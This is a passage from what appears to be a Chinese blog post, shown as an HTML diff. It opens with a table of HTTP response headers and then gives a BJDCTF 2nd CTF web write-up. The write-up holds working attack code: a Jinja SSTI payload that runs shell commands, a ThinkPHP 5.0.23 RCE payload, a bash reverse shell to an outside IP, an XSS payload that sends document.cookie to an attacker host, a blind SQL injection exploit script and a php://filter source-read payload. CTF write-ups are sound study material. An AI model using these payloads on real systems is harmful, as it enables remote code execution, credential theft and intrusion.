+<td align="center">Expires</td>
+<td align="center">指定一个日期/时间，超过该时间则认为此回应已经过期</td>
+<td align="center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Last-Modified</td>
+<td align="center">所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
+<td align="center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Link</td>
+<td align="center">用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的</td>
+<td align="center"><code>Link: ; rel=&quot;alternate&quot;</code>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-google_canonical-32">32]</a></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP_Location">Location</a></td>
+<td align="center">用来 进行重定向，或者在创建了某个新资源时使用。</td>
+<td align="center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">P3P</td>
+<td align="center">用于支持设置<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/P3P">P3P</a>策略，标准格式为“<code>P3P:CP=&quot;your_compact_policy&quot;</code>”。然而P3P规范并不成功，[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-33">33]</a>大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。</td>
+<td align="center"><code>P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Pragma</td>
+<td align="center">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td>
+<td align="center"><code>Pragma: no-cache</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Proxy-Authenticate</td>
+<td align="center">要求在访问代理时提供身份认证信息。</td>
+<td align="center"><code>Proxy-Authenticate: Basic</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%85%AC%E9%92%A5%E5%9B%BA%E5%AE%9A">Public-Key-Pins</a>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-34">34]</a></td>
+<td align="center">用于缓解<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>，声明网站认证使用的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">传输层安全协议</a>证书的散列值</td>
+<td align="center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Refresh</td>
+<td align="center">用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“<code>http://www.w3.org/pub/WWW/People.html</code>”。</td>
+<td align="center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td>
+<td align="center">专利并非标准Netscape实现的扩展，但大部分网页浏览器也支持。</td>
+</tr>
+<tr>
+<td align="center">Retry-After</td>
+<td align="center">如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。 [<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-35">35]</a></td>
+<td align="center">Example 1: <code>Retry-After: 120</code>Example 2: <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Server</td>
+<td align="center">服务器的名字</td>
+<td align="center"><code>Server: Apache/2.4.1 (Unix)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Set-Cookie</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Cookie">HTTP cookie</a></td>
+<td align="center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Status</td>
+<td align="center">通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。 [<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-36">36]</a></td>
+<td align="center"><code>Status: 200 OK</code></td>
+<td align="center">Not listed as a <a target="_blank" rel="noopener" href="http://www.iana.org/assignments/message-headers/message-headers.xml">registered field name</a></td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">Strict-Transport-Security</a></td>
+<td align="center">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。</td>
+<td align="center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Trailer</td>
+<td align="center">这个头部数值指示了在这一系列头部信息由由<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输编码</a>编码。</td>
+<td align="center"><code>Trailer: Max-Forwards</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Transfer-Encoding</td>
+<td align="center">用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。</td>
+<td align="center"><code>Transfer-Encoding: chunked</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Upgrade</td>
+<td align="center">要求客户端升级到另一个协议。</td>
+<td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Vary</td>
+<td align="center">告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。</td>
+<td align="center"><code>Vary: *</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Via</td>
+<td align="center">告知代理服务器的客户端，当前回应是通过什么途径发送的。</td>
+<td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Warning</td>
+<td align="center">一般性的警告，告知在实体内容体中可能存在错误。</td>
+<td align="center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">WWW-Authenticate</td>
+<td align="center">表明在请求获取这个实体时应当使用的认证模式。</td>
+<td align="center"><code>WWW-Authenticate: Basic</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">X-Frame-Options[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-37">37]</a></td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81">点击劫持</a>保护：<code>deny</code>：该页面不允许在 frame 中展示，即使是同域名内。<code>sameorigin</code>：该页面允许同域名内在 frame 中展示。<code>allow-from *uri*</code>：该页面允许在指定uri的 frame 中展示。<code>allowall</code>：允许任意位置的frame显示，非标准值。</td>
+<td align="center"><code>X-Frame-Options: deny</code></td>
+<td align="center">过时的[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-38">38]</a></td>
+</tr>
+</tbody></table>
+<p><strong>常见的非标准回应字段</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">字段名</th>
+<th align="center">说明</th>
+<th align="center">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">X-XSS-Protection[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-39">39]</a></td>
+<td align="center">跨站脚本攻击 （XSS）过滤器</td>
+<td align="center"><code>X-XSS-Protection: 1; mode=block</code></td>
+</tr>
+<tr>
+<td align="center">Content-Security-Policy, <em>X-Content-Security-Policy</em>, <em>X-WebKit-CSP</em>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-40">40]</a></td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5">内容安全策略</a>定义。</td>
+<td align="center"><code>X-WebKit-CSP: default-src &#39;self&#39;</code></td>
+</tr>
+<tr>
+<td align="center">X-Content-Type-Options[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-41">41]</a></td>
+<td align="center">唯一允许的数值为”nosniff”，防止 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> 对文件进行MIME类型嗅探。这也对 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Google_Chrome">Google Chrome</a> 下载扩展时适用。[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-42">42]</a></td>
+<td align="center"><code>X-Content-Type-Options: nosniff</code></td>
+</tr>
+<tr>
+<td align="center">X-Powered-By[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-43">43]</a></td>
+<td align="center">表明用于支持当前网页应用程序的技术（例如：PHP）（版本号细节通常放置在 X-Runtime 或 X-Version 中）</td>
+<td align="center"><code>X-Powered-By: PHP/5.4.0</code></td>
+</tr>
+<tr>
+<td align="center">X-UA-Compatible[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-44">44]</a></td>
+<td align="center">推荐指定的渲染引擎（通常是向后兼容模式）来显示内容。也用于激活 Internet Explorer 中的 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Google_Chrome_Frame">Chrome Frame</a>。</td>
+<td align="center"><code>X-UA-Compatible: IE=EmulateIE7</code> <code>X-UA-Compatible: IE=edge</code> <code>X-UA-Compatible: Chrome=1</code></td>
+</tr>
+<tr>
+<td align="center">X-Content-Duration[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-45">45]</a></td>
+<td align="center">指出音视频的长度，单位为秒。只受Gecko内核浏览器支持。</td>
+<td align="center"><code>X-Content-Duration: 42.666</code></td>
+</tr>
+</tbody></table>
+<h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>查看源码发现qaq,访问提示ssti</p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184958.png"></p>
+<p>直接用vulhub上的payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就能得到flag</p>
+<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>提示thinkphp5，5.0.23 RCE的payload可以读flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">POST：_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>打开提示swp,访问<code>.index.php.swp</code>，下载下来 <code>vi -r</code>恢复得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到没过滤管道和空格</p>
+<p>由于buu靶机不能访问内网，新建一个小号去basic里找到linux-labs</p>
+<p>新建一个index.php,写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.55.214&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后起一个web服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8000</span><br></pre></td></tr></table></figure>
+
+<p>nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321195223.png" style="zoom:80%;">
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321195320.png" style="zoom:80%;">
+
+<h3 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h3><p>扫目录发现.git源码泄露，恢复源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>题目考察的知识点是php原生类反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a =<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://vps/?a=&#x27;+document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200324172728.png" style="zoom:80%;">
+
+<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>fuzz一波发现过滤了好多东西</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322153408.png" style="zoom:80%;">
+
+<p>union select 单双引号 =号都过滤了</p>
+<p>扫路径扫到robots.txtl里面hint.txt里有</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们就可以加个转义符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39;$password&#39;</span><br></pre></td></tr></table></figure>
+
+<p>此时username的值就被认为是<code>admin\&#39; and password=</code></p>
+<p><code>$password</code>传 <code>or sleep(3)%23</code>发现能够延时，所以我们在sleep(3)传入注入语句</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if((ascii(substr((&#123;1&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#</span><br></pre></td></tr></table></figure>
+
+<p>由于表中只有一条数据，所以我们在1位置直接传字段的名字就能跑出数据了</p>
+<p>简单做个实验</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">10</span>),username <span class="built_in">varchar</span>(<span class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span> (<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322185056.png" style="zoom: 67%;">
+
+<p>发现插入多条数据也可以这样用,但是有相似的话就会查出多条数据</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322193353.png" style="zoom: 67%;">
+
+<p>写了个exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b4b1391f-dea5-4d42-8e61-f68b27487be2.node3.buuoj.cn&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">	<span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlin</span>(<span class="params">sql</span>):</span></span><br><span class="line">	database=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		f1=database</span><br><span class="line">		top=<span class="number">127</span></span><br><span class="line">		low=<span class="number">33</span></span><br><span class="line">		<span class="keyword">while</span> low&lt;=top:</span><br><span class="line">			mid=(top+low)//<span class="number">2</span></span><br><span class="line">			data1=&#123;</span><br><span class="line">			<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) &gt; &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">			&#125;</span><br><span class="line">			data2=&#123;</span><br><span class="line">			<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				r1=requests.post(url,data=data2)</span><br><span class="line">				print(i,mid)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&#x27;BJD needs to be stronger&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">					database+=chr(mid)</span><br><span class="line">					print(database)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				r=requests.post(url,data=data1)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;BJD needs to be stronger&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					low=mid+<span class="number">1</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">&#x27;P3rh4ps&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					top=mid<span class="number">-1</span></span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">if</span> database==f1:</span><br><span class="line">			print(database)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment"># database=&#x27;p3rh4ps&#x27;</span></span><br><span class="line">sql0=<span class="string">&#x27;database()&#x27;</span></span><br><span class="line">sql1=<span class="string">&#x27;username&#x27;</span></span><br><span class="line">sqlin(sql1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>抓包，看到http头里有<code>hint:home.php</code></p>
+<p>访问会跳转到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=system</span><br></pre></td></tr></table></figure>
+
+<p><code>php://filter</code>读源码，<code>system.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=system</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>]) || $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] !== sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str2 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str3 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str4 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;</span><br><span class="line">$filter2 = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q3&#x27;</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    $method = $_POST[<span class="string">&#x27;q3&#x27;</span>];</span><br><span 